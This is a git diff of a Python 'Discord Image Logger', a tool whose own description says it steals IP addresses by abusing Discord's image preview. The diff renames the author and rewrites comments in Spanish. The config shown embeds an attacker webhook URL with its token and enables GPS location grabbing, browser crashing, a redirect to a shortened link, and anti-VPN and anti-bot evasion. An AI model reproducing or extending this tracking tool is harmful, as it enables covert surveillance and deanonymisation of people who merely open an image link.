@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
@@ -8,63 +5,53 @@ import requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Rynn"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1096015923225301082/EKiixrtvh50BUkX0rqhrHmxpQqFj6u96rZg_Vq8TMYlYK0o1Ypm2WzckG8c2VeDxbRpd",
-    "image": "https://imgur.com/lvZeXE4", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://imgur.com/lvZeXE4",
+    "imageArgument": True, 
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger", # Webhook username
+    "color": 0x00FFFF, # Color HEX para el embed
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Intenta crashear/conjelar el navegador
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Usa GPS para intentar localizar exactamente
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": { # Mensaje Custom
+        "doMessage": False, # Activar?
+        "message": "This browser has been pwned by Rynn's Image Logger.",
+        "richMessage": True, # rich text?
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, # previene VPNs
                 # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+                # 1 = No ping cuando VPN
+                # 2 = No enviar cuando VPN
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, # envia una alerta
+    "buggedImage": True, # muestra la imagen bugeada
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
+                # 1 = posiblemente un bot
+                # 2 = 100% un bot
+                # 3 = no enviar ping cuando puede que sea un bot
+                # 4 = no enviar ping cuando es un bot
     
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://tuit.es/c8MsB" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect a una pagina?
+        "page": "https://tuit.es/c8MsB"
     },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image
 }
 
-blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "34", "35", "104", "143", "164") 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         if not ip.startswith(("34", "35")): return
